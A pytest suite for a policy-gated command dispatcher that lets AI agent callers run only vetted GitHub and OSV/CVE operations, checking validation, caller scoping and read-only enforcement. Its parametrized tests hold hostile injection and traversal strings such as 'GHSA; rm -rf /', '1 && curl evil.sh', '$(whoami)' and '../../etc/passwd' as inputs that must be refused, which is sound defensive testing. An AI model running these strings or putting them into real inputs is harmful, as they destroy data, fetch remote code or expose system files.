#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import json
import tomllib
import urllib.error
import urllib.request
from email.message import Message
from pathlib import Path
from types import TracebackType
from typing import NoReturn

import pytest

from vetted_ops import cli, config, ops

CONFIG_TOML = """
workspace = '{workspace}'

[repos]
tracker = "acme/tracker"
upstream = "acme/product"

[values]
labels = ["needs triage", "cve allocated"]
milestones = ["1.2.3"]
assignees = ["alice"]
issue_states = ["open", "closed", "all"]
pr_states = ["open", "closed", "merged", "all"]
upstream_labels = ["ready for maintainer review", "area:scheduler"]
close_reasons = ["completed", "not planned"]
ecosystems = ["PyPI", "Maven", "npm"]
board_project_id = "PVT_proj"
board_status_field_id = "PVTSSF_field"

[values.board_columns]
"Assessed" = "opt_assessed"

[callers]
"security-issue-sync" = ["issue-view", "issue-add-label", "issue-comment", "issue-close", "cve-check-published"]
"security-issue-triage" = ["issue-view", "osv-get-vuln", "osv-query-package", "cve-check-published"]
"dependency-audit" = ["osv-query-package", "osv-query-commit", "osv-query-batch"]
"""


@pytest.fixture()
def policy_path(tmp_path: Path) -> Path:
    """The policy on disk — for tests that drive `cli.main` end to end."""
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))
    return cfg_path


@pytest.fixture()
def policy(tmp_path: Path) -> config.Config:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))
    return config.load(cfg_path)


def run(argv: list[str], cfg_path: Path) -> int:
    return cli.main([*argv, "--config", str(cfg_path)])


# --- the catalogue is closed -------------------------------------------------


def test_every_op_declares_validators_for_all_its_params() -> None:
    """A parameter with no validator would fall through unchecked."""
    known = {
        "number",
        "comment_id",
        "run_id",
        "ref",
        "base",
        "head",
        "prefix",
        "path",
        "login",
        "team",
        "ghsa",
        "item_id",
        "content_id",
        "title",
        "vuln_id",
        "package_name",
        "version",
        "commit_hash",
        "cve_id",
    }
    for op in ops.OPS.values():
        for param in op.params:
            assert param in known or param in op.enums or param in op.body_files, (
                f"{op.name}: parameter {param!r} has no validator"
            )


def test_every_builder_produces_a_gh_argv(policy: config.Config) -> None:
    """Every 'gh' operation must invoke nothing other than gh."""
    sample = {
        "number": "1",
        "comment_id": "1",
        "run_id": "42",
        "ref": "main",
        "base": "main",
        "head": "v1",
        "prefix": "v1",
        "path": "a/b.py",
        "login": "alice",
        "team": "maintainers",
        "ghsa": "GHSA-aaaa-bbbb-cccc",
        "item_id": "PVTI_abc",
        "content_id": "I_abc",
        "title": "A tracker title",
        "label": "needs triage",
        "milestone": "1.2.3",
        "state": "open",
        "reason": "completed",
        "column": "Assessed",
        "body": "unused",
        "vuln_id": "OSV-2020-111",
        "package_name": "pytest",
        "version": "1.0.0",
        "commit_hash": "a1b2c3d",
        "cve_id": "CVE-2023-1234",
        "ecosystem": "PyPI",
    }
    body = policy.workspace / "body.md"
    body.write_text("x")
    for op in ops.OPS.values():
        params = {p: (str(body) if p in op.body_files else sample[p]) for p in op.params}
        result = op.build(policy.as_mapping(), **params)

        if op.backend == "gh":
            assert isinstance(result, list)
            assert result[0] == "gh", op.name
            assert all(isinstance(a, str) for a in result), op.name
        elif op.backend == "http-read":
            assert isinstance(result, dict)
            assert isinstance(result.get("url"), str), op.name


def test_every_http_operation_is_read_only() -> None:
    """HTTP operations are unprivileged reads by construction."""
    for op in ops.OPS.values():
        if op.backend == "http-read":
            assert not op.writes, f"{op.name} has backend='http-read' but writes=True"


def test_osv_get_vuln_builder(policy: config.Config) -> None:
    op = ops.resolve("osv-get-vuln")
    params, _ = cli._validate_params(op, ["GHSA-7rjr-3q55-vv33"], policy)
    req = cli.build_argv(op, params, policy)
    assert isinstance(req, dict)
    assert req["method"] == "GET"
    assert req["url"] == "https://api.osv.dev/v1/vulns/GHSA-7rjr-3q55-vv33"


def test_osv_query_package_builder(policy: config.Config) -> None:
    op = ops.resolve("osv-query-package")
    params, _ = cli._validate_params(op, ["jinja2", "PyPI", "2.11.2"], policy)
    req = cli.build_argv(op, params, policy)
    assert isinstance(req, dict)
    assert req["method"] == "POST"
    assert req["url"] == "https://api.osv.dev/v1/query"
    assert req["headers"] == {"Content-Type": "application/json"}
    body_data = json.loads(str(req["body"]))
    assert body_data == {
        "package": {"name": "jinja2", "ecosystem": "PyPI"},
        "version": "2.11.2",
    }


def test_osv_query_commit_builder(policy: config.Config) -> None:
    op = ops.resolve("osv-query-commit")
    params, _ = cli._validate_params(op, ["a1b2c3d4e5f67890"], policy)
    req = cli.build_argv(op, params, policy)
    assert isinstance(req, dict)
    assert req["method"] == "POST"
    assert req["url"] == "https://api.osv.dev/v1/query"
    assert req["headers"] == {"Content-Type": "application/json"}
    body_data = json.loads(str(req["body"]))
    assert body_data == {"commit": "a1b2c3d4e5f67890"}


def test_osv_query_batch_builder(policy: config.Config) -> None:
    body = policy.workspace / "batch.json"
    body.write_text('{"queries": []}')
    op = ops.resolve("osv-query-batch")
    params, sent = cli._validate_params(op, [str(body)], policy)
    req = cli.build_argv(op, params, policy)
    assert isinstance(req, dict)
    assert req["method"] == "POST"
    assert req["url"] == "https://api.osv.dev/v1/querybatch"
    assert req["headers"] == {"Content-Type": "application/json"}
    assert sent == b'{"queries": []}'


def test_cve_check_published_builder(policy: config.Config) -> None:
    op = ops.resolve("cve-check-published")
    params, _ = cli._validate_params(op, ["CVE-2023-1234"], policy)
    req = cli.build_argv(op, params, policy)
    assert isinstance(req, dict)
    assert req["method"] == "GET"
    assert req["url"] == "https://cveawg.mitre.org/api/cve/CVE-2023-1234"


@pytest.mark.parametrize(
    "valid_id",
    [
        "GHSA-7rjr-3q55-vv33",
        "RHSA-2021:4321",
        "SUSE-SU-2021:1234-1",
        "ALSA-2021:1234",
        "RLSA-2021:1234",
        "CVE-2021-45046",
        "PYSEC-2021-123",
        "RUSTSEC-2020-0001",
        "GO-2022-0123",
        "OSV-2020-111",
    ],
)
def test_valid_vuln_ids_are_accepted(valid_id: str) -> None:
    assert ops.vuln_id(valid_id) == valid_id


@pytest.mark.parametrize(
    "hostile",
    [
        "../../etc/passwd",
        "GHSA; rm -rf /",
        "GHSA $(whoami)",
        "GHSA `id`",
        "GHSA\nnewline",
        "",
        "x",
    ],
)
def test_hostile_vuln_ids_are_refused(hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.vuln_id(hostile)


@pytest.mark.parametrize(
    "valid_pkg",
    [
        "jinja2",
        "@scope/package",
        "apache-airflow",
        "org.apache.logging.log4j:log4j-core",
        "github.com/gin-gonic/gin",
        "osv.dev",
        "pkg_name",
    ],
)
def test_valid_package_names_are_accepted(valid_pkg: str) -> None:
    assert ops.package_name(valid_pkg) == valid_pkg


@pytest.mark.parametrize(
    "hostile",
    [
        "../../etc/passwd",
        "pkg; rm -rf /",
        "pkg $(whoami)",
        "pkg `id`",
        "pkg\nnewline",
        "",
    ],
)
def test_hostile_package_names_are_refused(hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.package_name(hostile)


@pytest.mark.parametrize(
    "valid_commit",
    [
        "a1b2c3d",
        "0123456789abcdef",
        "a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4",
        "a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef",
    ],
)
def test_valid_commits_are_accepted(valid_commit: str) -> None:
    assert ops.commit_hash(valid_commit) == valid_commit


@pytest.mark.parametrize(
    "invalid_commit",
    [
        "a1b2c3",  # too short (< 7)
        "a" * 65,  # too long (> 64)
        "a1b2c3g",  # non-hex
        "A1B2C3D",  # uppercase
        "main",
        "../../etc",
        "",
    ],
)
def test_invalid_commits_are_refused(invalid_commit: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.commit_hash(invalid_commit)


@pytest.mark.parametrize(
    "valid_cve",
    [
        "CVE-2023-1234",
        "CVE-1999-0001",
        "CVE-2024-1234567",
    ],
)
def test_valid_cve_ids_are_accepted(valid_cve: str) -> None:
    assert ops.cve_id(valid_cve) == valid_cve


@pytest.mark.parametrize(
    "invalid_cve",
    [
        "cve-2023-1234",  # lowercase
        "CVE-23-1234",  # 2-digit year
        "CVE-2023-123",  # 3-digit sequence
        "GHSA-aaaa-bbbb-cccc",
        "../../etc/passwd",
        "",
    ],
)
def test_invalid_cve_ids_are_refused(invalid_cve: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.cve_id(invalid_cve)


def test_ecosystem_must_be_one_of_the_configured_values(policy: config.Config) -> None:
    op = ops.resolve("osv-query-package")
    with pytest.raises(ops.ParamError, match="not one of the configured values"):
        cli._validate_params(op, ["jinja2", "UnknownEcosystem", "1.0.0"], policy)


def test_http_endpoints_can_be_customized(tmp_path: Path) -> None:
    custom_toml = """
workspace = '{workspace}'

[repos]
upstream = "acme/product"

[endpoints]
osv_api = "https://custom-osv.example.com/api"
cve_services_api = "https://custom-cve.example.com/api"

[values]
ecosystems = ["PyPI"]

[callers]
"security-issue-triage" = ["osv-get-vuln", "cve-check-published"]
"""
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "custom.toml"
    cfg_path.write_text(custom_toml.format(workspace=workspace))
    custom_cfg = config.load(cfg_path)

    op_osv = ops.resolve("osv-get-vuln")
    req_osv = op_osv.build(custom_cfg.as_mapping(), vuln_id="OSV-1")
    assert isinstance(req_osv, dict)
    assert req_osv["url"] == "https://custom-osv.example.com/api/vulns/OSV-1"

    op_cve = ops.resolve("cve-check-published")
    req_cve = op_cve.build(custom_cfg.as_mapping(), cve_id="CVE-2023-1234")
    assert isinstance(req_cve, dict)
    assert req_cve["url"] == "https://custom-cve.example.com/api/cve/CVE-2023-1234"


# --- parameters can never become commands ------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "1; rm -rf /",
        "1 && curl evil.sh",
        "$(whoami)",
        "`id`",
        "1\nrm -rf /",
        "../../etc/passwd",
        "1|tee /tmp/x",
    ],
)
def test_hostile_numbers_are_refused(policy: config.Config, hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.number(hostile)


def test_parameters_may_not_start_with_a_dash(policy: config.Config) -> None:
    """Blocks flag injection — e.g. sneaking --body or --repo into gh."""
    op = ops.resolve("issue-view")
    with pytest.raises(ops.ParamError, match="may not start with"):
        cli._validate_params(op, ["--repo"], policy)


def test_label_must_be_one_of_the_configured_values(policy: config.Config) -> None:
    op = ops.resolve("issue-add-label")
    with pytest.raises(ops.ParamError, match="not one of the configured values"):
        cli._validate_params(op, ["7", "arbitrary-label"], policy)


def test_configured_label_is_accepted(policy: config.Config) -> None:
    op = ops.resolve("issue-add-label")
    params, _body = cli._validate_params(op, ["7", "cve allocated"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv == [
        "gh",
        "issue",
        "edit",
        "7",
        "--repo",
        "acme/tracker",
        "--add-label",
        "cve allocated",
    ]


# --- body files: content is free, location is not ----------------------------


def test_body_file_outside_the_workspace_is_refused(policy: config.Config, tmp_path: Path) -> None:
    secret = tmp_path / "id_rsa"
    secret.write_text("PRIVATE KEY")
    op = ops.resolve("issue-comment")
    with pytest.raises(ops.ParamError, match="must live under the workspace"):
        cli._validate_params(op, ["7", str(secret)], policy)


def test_body_file_content_may_contain_anything(policy: config.Config) -> None:
    """The body is passed by reference, so shell metacharacters are just text."""
    body = policy.workspace / "note.md"
    body.write_text("`id` $(whoami) && rm -rf / ; drop table\n")
    op = ops.resolve("issue-comment")
    params, sent = cli._validate_params(op, ["7", str(body)], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    # The body reaches `gh` on stdin, not as a path it opens for itself.
    assert argv[-2:] == ["--body-file", "-"]
    assert sent == b"`id` $(whoami) && rm -rf / ; drop table\n"


def test_issue_edit_body_sends_the_body_on_stdin(policy: config.Config) -> None:
    """
    Editing a body replaces the whole issue text, so it takes the same
    read-once path as a comment: `gh` is handed "-" and the bytes we validated
    are the bytes that get published.
    """
    body = policy.workspace / "new-body.md"
    body.write_text("### Affected versions\n\napache-airflow `< NEXT VERSION`\n")
    op = ops.resolve("issue-edit-body")
    params, sent = cli._validate_params(op, ["611", str(body)], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv[:5] == ["gh", "issue", "edit", "611", "--repo"]
    assert argv[-2:] == ["--body-file", "-"]
    assert sent == b"### Affected versions\n\napache-airflow `< NEXT VERSION`\n"


def test_issue_edit_body_refuses_a_body_outside_the_workspace(policy: config.Config, tmp_path: Path) -> None:
    stray = tmp_path / "elsewhere.md"
    stray.write_text("not mine")
    op = ops.resolve("issue-edit-body")
    with pytest.raises(ops.ParamError, match="must live under the workspace"):
        cli._validate_params(op, ["611", str(stray)], policy)


def test_issue_edit_title_passes_the_title_as_one_argv_element(policy: config.Config) -> None:
    """
    A title is a single line, so unlike a body it rides in argv rather than on
    stdin. It still never reaches a shell — punctuation a reviewer asks for
    (quotes, semicolons, backticks) has to survive to `gh` intact and inert.
    """
    op = ops.resolve("issue-edit-title")
    title = 'Session cookie overrides `Authorization`; enables "session fixation"'
    params, sent = cli._validate_params(op, ["555", title], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv[:5] == ["gh", "issue", "edit", "555", "--repo"]
    assert argv[-2:] == ["--title", title]
    assert sent is None


@pytest.mark.parametrize(
    "bad, match",
    [
        ("", "empty"),
        ("   ", "empty"),
        ("Real title\nsecond line", "single line"),
        ("Real title\rsecond line", "single line"),
        ("x" * 257, "caps a title at 256"),
    ],
)
def test_issue_edit_title_refuses_shapes_that_are_never_a_title(
    policy: config.Config, bad: str, match: str
) -> None:
    """
    An empty title would blank the issue rather than retitle it, and a newline
    would hide everything after it — both are silent corruption, so they are
    refused rather than trimmed.
    """
    op = ops.resolve("issue-edit-title")
    with pytest.raises(ops.ParamError, match=match):
        cli._validate_params(op, ["555", bad], policy)


def test_issue_edit_title_strips_surrounding_whitespace(policy: config.Config) -> None:
    op = ops.resolve("issue-edit-title")
    params, _ = cli._validate_params(op, ["555", "  Padded title  "], policy)
    assert params["title"] == "Padded title"


def test_milestone_create_is_gated_on_the_configured_milestones(policy: config.Config) -> None:
    """
    Creating a milestone is enum-gated on the same list that gates assigning
    one. The policy file stays the authority: a new milestone is a reviewed
    edit there first, and only then can it be created or assigned.
    """
    op = ops.resolve("milestone-create")
    with pytest.raises(ops.ParamError, match="not one of the configured values"):
        cli._validate_params(op, ["Providers 2026-10-06"], policy)

    params, _ = cli._validate_params(op, ["1.2.3"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv == ["gh", "api", "repos/acme/tracker/milestones", "-f", "title=1.2.3"]


def test_issue_remove_assignee_is_gated_on_the_roster(policy: config.Config) -> None:
    """
    Unassigning is how the release-manager hand-off retires the remediation
    developer. It is enum-gated on the same roster as assigning, so a typo
    cannot quietly unassign nobody and report success.
    """
    op = ops.resolve("issue-remove-assignee")
    with pytest.raises(ops.ParamError, match="not one of the configured values"):
        cli._validate_params(op, ["611", "not-on-the-roster"], policy)

    params, _ = cli._validate_params(op, ["611", "alice"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv == [
        "gh",
        "issue",
        "edit",
        "611",
        "--repo",
        "acme/tracker",
        "--remove-assignee",
        "alice",
    ]


def test_no_read_operation_sends_fields_without_an_explicit_get(policy: config.Config) -> None:
    """
    `gh api` switches to POST the moment any -f/-F field is present. A read that
    passes one without saying `-X GET` is therefore sent to a route that does not
    exist, and comes back 404 — which reads like "the ref is wrong" rather than
    "the request was malformed", so it can sit unnoticed for a long time.

    Both `repo-file` and `repo-tree` shipped that way. This asserts the shape for
    every read in the catalogue rather than for those two, so the next operation
    that passes a field cannot reintroduce it.
    """
    sample = {
        "number": "1",
        "comment_id": "1",
        "run_id": "42",
        "ref": "main",
        "base": "main",
        "head": "v1",
        "prefix": "v1",
        "path": "a/b.py",
        "login": "alice",
        "team": "sec",
        "ghsa": "GHSA-aaaa-bbbb-cccc",
        "item_id": "PVTI_abc",
        "title": "A tracker title",
        "label": "needs triage",
        "milestone": "1.2.3",
        "state": "open",
        "reason": "completed",
        "column": "Assessed",
        "query": "pr-liveness",
        "body": "unused",
    }
    body = policy.workspace / "shape.md"
    body.write_text("x")

    for name, op in ops.OPS.items():
        if op.writes or op.backend != "gh":
            continue
        params = {}
        for p in op.params:
            if p in op.body_files:
                params[p] = str(body)
            elif p in op.enums:
                params[p] = policy.enum_values(op.enums[p])[0]
            else:
                params[p] = sample[p]
        argv = op.build(policy.as_mapping(), **params)
        assert isinstance(argv, list)
        if "graphql" in argv:
            continue
        if any(a in ("-f", "-F") for a in argv):
            assert "-X" in argv, (
                f"{name} passes a -f/-F field without an explicit method; gh api will POST it"
            )
            assert argv[argv.index("-X") + 1] == "GET", f"{name} sends fields with a non-GET method"


def test_repo_tree_refuses_to_report_a_truncated_listing(policy: config.Config) -> None:
    """
    `gh api .../git/trees/<ref>?recursive=1` answers a large repository with
    `truncated: true` and a *partial* `tree`. Projecting straight to
    `.tree[].path` discards that flag, so the caller receives a short listing
    that is indistinguishable from a complete one — and concludes that whole
    directories do not exist.

    That is the worst shape a read operation can fail in: silently, with
    plausible output. The builder must surface the truncation as an error so the
    dispatcher exits non-zero (code 4) instead of answering with half a tree.
    """
    op = ops.resolve("repo-tree")
    params, _ = cli._validate_params(op, ["main"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)

    jq = argv[argv.index("--jq") + 1]
    assert ".truncated" in jq, "repo-tree drops the API's truncation flag"
    assert "error(" in jq, "repo-tree must fail loudly on a truncated tree"
    # The complete-tree path still projects to plain paths.
    assert ".tree[].path" in jq


def test_board_add_item_takes_a_content_node_id(policy: config.Config) -> None:
    """
    Adding an issue to the board keys on the *content* node id, not a project
    item id — the item does not exist yet. GitHub returns the existing item when
    one is already present, so the operation is safely idempotent.
    """
    op = ops.resolve("board-add-item")
    params, _ = cli._validate_params(op, ["I_kwDOabc123"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv[:3] == ["gh", "api", "graphql"]
    assert "content=I_kwDOabc123" in argv
    assert "project=PVT_proj" in argv
    assert "addProjectV2ItemById" in argv[-1]


def test_board_add_item_refuses_a_non_node_id(policy: config.Config) -> None:
    op = ops.resolve("board-add-item")
    with pytest.raises(ops.ParamError):
        cli._validate_params(op, ["../../etc/passwd"], policy)


def test_board_archive_item_targets_the_configured_project(policy: config.Config) -> None:
    op = ops.resolve("board-archive-item")
    params, _ = cli._validate_params(op, ["PVTI_kwDOabc"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert "item=PVTI_kwDOabc" in argv
    assert "project=PVT_proj" in argv
    assert "archiveProjectV2Item" in argv[-1]


def test_milestone_close_is_by_number_and_hits_the_tracker(policy: config.Config) -> None:
    """
    Closing is by number because the REST endpoint is number-addressed; there is
    no title-keyed route. The number validator still refuses anything that is
    not a plain integer, so no path can be smuggled into the URL.
    """
    op = ops.resolve("milestone-close")
    params, _ = cli._validate_params(op, ["64"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv == [
        "gh",
        "api",
        "repos/acme/tracker/milestones/64",
        "-X",
        "PATCH",
        "-f",
        "state=closed",
    ]

    with pytest.raises(ops.ParamError):
        cli._validate_params(op, ["64/../../secrets"], policy)


# --- per-caller scoping ------------------------------------------------------


def test_caller_may_not_run_an_operation_outside_its_manifest(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "security-issue-triage", "issue-close", "7", "completed"], cfg_path)
    assert rc == cli.EXIT_POLICY
    assert "not permitted to run" in capsys.readouterr().err


def test_unknown_caller_is_refused(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "not-a-skill", "issue-view", "7"], cfg_path)
    assert rc == cli.EXIT_POLICY
    assert "not declared in the config" in capsys.readouterr().err


def test_permitted_caller_reaches_dry_run(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "security-issue-sync", "issue-view", "7", "--dry-run"], cfg_path)
    assert rc == cli.EXIT_OK
    assert "gh issue view 7 --repo acme/tracker" in capsys.readouterr().out


def test_caller_is_required(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    workspace.chmod(0o700)
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["issue-view", "7"], cfg_path)
    assert rc == cli.EXIT_USAGE
    assert "--caller is required" in capsys.readouterr().err


# --- the repo is policy, not a parameter -------------------------------------


def test_repo_cannot_be_influenced_by_a_parameter(policy: config.Config) -> None:
    op = ops.resolve("issue-view")
    params, _body = cli._validate_params(op, ["7"], policy)
    argv = cli.build_argv(op, params, policy)
    assert isinstance(argv, list)
    assert argv[argv.index("--repo") + 1] == "acme/tracker"


def test_config_rejects_a_malformed_repo(tmp_path: Path) -> None:
    cfg_path = tmp_path / "bad.toml"
    cfg_path.write_text('workspace = "."\n[repos]\ntracker = "not a repo"\nupstream = "a/b"\n')
    with pytest.raises(config.ConfigError, match="owner/name"):
        config.load(cfg_path)


# --- the GraphQL surface stays closed ----------------------------------------


def test_graphql_query_text_is_never_a_parameter(policy: config.Config) -> None:
    """
    The caller names a query; the dispatcher supplies the text.

    This is the whole point of the named-query mechanism: `gh api graphql`
    normally takes a document as a string, which is exactly the unbounded
    surface the catalogue exists to remove.
    """
    argv = ops.OPS["gql-pr-liveness"].build(policy.as_mapping(), number="7")
    query_args = [a for a in argv if a.startswith("query=")]
    assert len(query_args) == 1
    path = Path(query_args[0].removeprefix("query=@"))
    assert path.is_file()
    assert ops.QUERIES_DIR.resolve() in path.parents


def test_graphql_repo_comes_from_policy_not_parameters(policy: config.Config) -> None:
    argv = ops.OPS["gql-pr-review-threads"].build(policy.as_mapping(), number="7")
    assert "owner=acme" in argv
    assert "repo=product" in argv


@pytest.mark.parametrize(
    "hostile",
    ["../../../etc/passwd", "pr-liveness/../../secret", "Absolute", "pr liveness", ""],
)
def test_unknown_or_hostile_query_names_are_refused(hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.query_name(hostile)


def test_every_shipped_query_is_registered_as_an_operation() -> None:
    """A .graphql file nobody registered is dead weight; a registration with no
    file is a runtime failure. Neither should survive review."""
    on_disk = {q.stem for q in ops.QUERIES_DIR.glob("*.graphql")}
    assert on_disk == set(ops.GRAPHQL_QUERIES)
    for name in ops.GRAPHQL_QUERIES:
        assert f"gql-{name}" in ops.OPS


# --- widening the catalogue must not widen the posture -----------------------


def test_the_catalogue_offers_no_merge_operation() -> None:
    """
    Merging is the framework's deliberately-deferred Agentic Autonomous mode:
    `quick-merge` prints a merge command for the maintainer rather than merging.
    A vetted merge op would hand the agent the one capability the surrounding
    design withholds, so its absence is a decision, not an oversight.
    """
    assert not [name for name in ops.OPS if "merge" in name]


def test_every_shipped_query_carries_the_asf_licence_header() -> None:
    """
    Apache RAT runs as its own CI workflow, not as a prek hook, so an unstamped
    file is invisible locally and fails only after the PR is pushed. Assert it
    here, where the feedback is immediate.
    """
    for query in ops.QUERIES_DIR.glob("*.graphql"):
        text = query.read_text(encoding="utf-8")
        assert "Licensed to the Apache Software Foundation" in text, query.name
        assert "http://www.apache.org/licenses/LICENSE-2.0" in text, query.name


# --- tracker and upstream are different repositories -------------------------


def test_tracker_and_upstream_operations_never_cross(policy: config.Config) -> None:
    """
    `issue-*` addresses the private tracker; `repo-issue-*` addresses the public
    project. Confusing the two would post security-lifecycle content to a public
    issue, or hunt for a public issue in the tracker — so assert the split holds
    for every operation rather than trusting the naming.
    """
    sample = {
        "number": "1",
        "comment_id": "1",
        "run_id": "42",
        "ref": "main",
        "base": "main",
        "head": "v1",
        "prefix": "v1",
        "path": "a/b.py",
        "login": "alice",
        "team": "maintainers",
        "ghsa": "GHSA-aaaa-bbbb-cccc",
        "item_id": "PVTI_abc",
        "content_id": "I_abc",
        "title": "A tracker title",
        "label": "needs triage",
        "milestone": "1.2.3",
        "state": "open",
        "reason": "completed",
        "column": "Assessed",
        "body": "unused",
    }
    body = policy.workspace / "split.md"
    body.write_text("x")
    tracker, upstream = "acme/tracker", "acme/product"

    for name, op in ops.OPS.items():
        if op.backend != "gh":
            continue
        params = {}
        for p in op.params:
            if p in op.body_files:
                params[p] = str(body)
            elif p in op.enums:
                params[p] = policy.enum_values(op.enums[p])[0]
            else:
                params[p] = sample[p]
        res = op.build(policy.as_mapping(), **params)
        assert isinstance(res, list)
        argv = " ".join(res)
        if name.startswith("repo-issue-") or name.startswith("pr-") or name.startswith("gql-"):
            assert tracker not in argv, f"{name} reached the tracker"
        elif name.startswith("issue-") or name in {
            "label-list",
            "milestone-list",
            "milestone-create",
            "milestone-close",
            "collaborators",
        }:
            assert upstream not in argv, f"{name} reached the upstream repo"


# --- a ref may not walk out of the policy-pinned repository -------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "main/../../../users/attacker",
        "../other/repo",
        "v1.0/..",
        "a/../b",
    ],
)
def test_refs_may_not_traverse(hostile: str) -> None:
    """
    Refs are interpolated into API paths, so `..` in a ref could walk out of the
    repository the policy pinned once a client normalises the URL — defeating
    "the repo is not addressable". Git forbids `..` in ref names anyway.
    """
    with pytest.raises(ops.ParamError):
        ops.ref(hostile)


@pytest.mark.parametrize("legitimate", ["main", "v1.2.3", "release/0.2.0", "rc-1"])
def test_ordinary_refs_still_pass(legitimate: str) -> None:
    assert ops.ref(legitimate) == legitimate


def test_no_operation_interpolates_a_traversing_ref(policy: config.Config) -> None:
    """Belt and braces: no built argv may contain a `..` path segment."""
    sample = {
        "number": "1",
        "comment_id": "1",
        "run_id": "42",
        "ref": "main",
        "base": "main",
        "head": "v1",
        "prefix": "v1",
        "path": "a/b.py",
        "login": "alice",
        "team": "maintainers",
        "ghsa": "GHSA-aaaa-bbbb-cccc",
        "item_id": "PVTI_abc",
        "content_id": "I_abc",
        "title": "A tracker title",
        "body": "unused",
    }
    body = policy.workspace / "ref.md"
    body.write_text("x")
    for op in ops.OPS.values():
        if op.backend != "gh":
            continue
        params = {}
        for p in op.params:
            if p in op.body_files:
                params[p] = str(body)
            elif p in op.enums:
                params[p] = policy.enum_values(op.enums[p])[0]
            else:
                params[p] = sample[p]
        res = op.build(policy.as_mapping(), **params)
        assert isinstance(res, list)
        for arg in res:
            assert "/../" not in arg and not arg.endswith("/.."), op.name


# --------------------------------------------------------------------------
# The privilege boundary is the entry point, not --caller
# --------------------------------------------------------------------------


def test_read_dispatcher_refuses_a_write_whatever_caller_is_named(
    policy_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """
    The finding this split exists to close.

    `--caller` is chosen by whoever runs the command, so a caller name can never
    be the thing that stops a write. On the read dispatcher the refusal has to
    hold even when the invoker names the *most* privileged caller in the policy.
    """
    rc = cli.main(
        [
            "--caller",
            "security-issue-sync",
            "issue-add-label",
            "7",
            "cve allocated",
            "--config",
            str(policy_path),
            "--dry-run",
        ],
        read_only=True,
    )
    assert rc == cli.EXIT_POLICY
    assert "read-only dispatcher" in capsys.readouterr().err


def test_read_dispatcher_refuses_writes_before_consulting_policy(
    policy_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """A caller absent from the policy still gets the write refusal, not a
    config error — proving the check does not depend on the config at all."""
    rc = cli.main(
        [
            "--caller",
            "no-such-caller",
            "issue-close",
            "7",
            "completed",
            "--config",
            str(policy_path),
            "--dry-run",
        ],
        read_only=True,
    )
    assert rc == cli.EXIT_POLICY
    assert "read-only dispatcher" in capsys.readouterr().err


def test_repeated_caller_is_refused(policy_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """
    argparse keeps the last `--caller`, so repetition would let a command match
    a permission rule written against a read-only prefix while resolving to a
    privileged caller.
    """
    rc = cli.main(
        [
            "--caller",
            "security-issue-triage",
            "--caller",
            "security-issue-sync",
            "issue-add-label",
            "7",
            "cve allocated",
            "--config",
            str(policy_path),
            "--dry-run",
        ],
    )
    assert rc == cli.EXIT_POLICY
    assert "more than once" in capsys.readouterr().err


def test_read_dispatcher_still_runs_reads(policy_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc = cli.main(
        ["--caller", "security-issue-triage", "issue-view", "7", "--config", str(policy_path), "--dry-run"],
        read_only=True,
    )
    assert rc == cli.EXIT_OK
